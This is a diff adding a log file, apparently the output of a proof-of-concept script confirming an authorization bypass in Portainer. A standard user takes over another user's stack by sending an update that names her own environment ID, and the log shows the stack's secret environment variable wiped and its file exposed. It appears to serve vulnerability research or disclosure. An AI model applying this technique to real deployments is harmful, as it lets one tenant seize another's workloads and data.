@@ -1,0 +1,65 @@
+
+=== cleanup ===
+
+=== start two independent docker daemons + portainer ===
+
+=== wait for portainer ===
+portainer 2.45.0
+
+=== wait for dind daemons ===
+secres-env-a2: dockerd 29.9.2
+secres-env-b2: dockerd 29.9.2
+
+=== admin init ===
+
+=== create environments ===
+env-a=1 env-b=2
+
+=== create alice and bob (both Standard User) ===
+alice=2 bob=3
+
+=== alice -> env-a only | bob -> env-b only ===
+PUT endpoints/A -> 200
+PUT endpoints/B -> 200
+
+=== bob creates stack 'shared' on env-b ===
+bob stack id=1  {"Id":1,"Name":"shared","Type":2,"EndpointId":2,"SwarmId":"","EntryPoint":"docker-compose.yml","Env":[{"name":"BOB_SECRET","value":"bobs-private-value"}],"Resou
+
+=== alice creates stack 'shared' on env-a (establishes her resource control at A/shared) ===
+alice stack id=2
+
+=== wait for bob's stack deployment to settle (Status=3 means deploying) ===
+bob stack status=1 (1=active)
+
+=== CONTROL 1: alice reads bob's stack on env-b ===
+HTTP 403  (expect 403)
+{"message":"Permission denied to access environment","details":"Access denied to environment"}
+
+=== CONTROL 2: alice updates bob's stack with endpointId=env-b (the stack's REAL environment) ===
+HTTP 403  (expect 403: she has no access to env-b)
+{"message":"Permission denied to access environment","details":"Access denied to environment"}
+
+=== CONTROL 3: alice updates with a nonexistent endpoint id ===
+HTTP 404  (expect 404 unpatched / 403 patched: parsed before authorization)
+
+=== ATTACK: same request, endpointId=env-a (the environment alice owns) ===
+HTTP 200  (expect 200 = bypass)
+{"Id":1,"Name":"shared","Type":2,"EndpointId":1,"SwarmId":"","EntryPoint":"docker-compose.yml","Env":[],"ResourceControl":null,"Status":3,"DeploymentStartStatus":1,"ProjectPath":"/data/compose/1","CreationDate":1793910484,"CreatedBy":"bob","UpdateDate":1793910491,"UpdatedBy":"alice","AdditionalFiles
+
+=== OBSERVE: stack record's environment, as admin ===
+{"Id":1,"Name":"shared","EndpointId":1,"Env":[]}
+
+=== OBSERVE: does bob still see his stack? ===
+
+=== OBSERVE: does alice now see bob's stack id 1? ===
+  YES: alice sees stack 1 ('shared')
+
+=== OBSERVE: alice can read the stack file she just took over ===
+HTTP 200
+{"StackFileContent":"services:\n  s:\n    image: alpine\n    command: [\"sleep\",\"120\"]\n"}
+
+=== RESULT ===
+VULNERABLE_CONFIRMED stack=1 from_endpoint=2 to_endpoint=1
+
+=== cleanup ===
+done
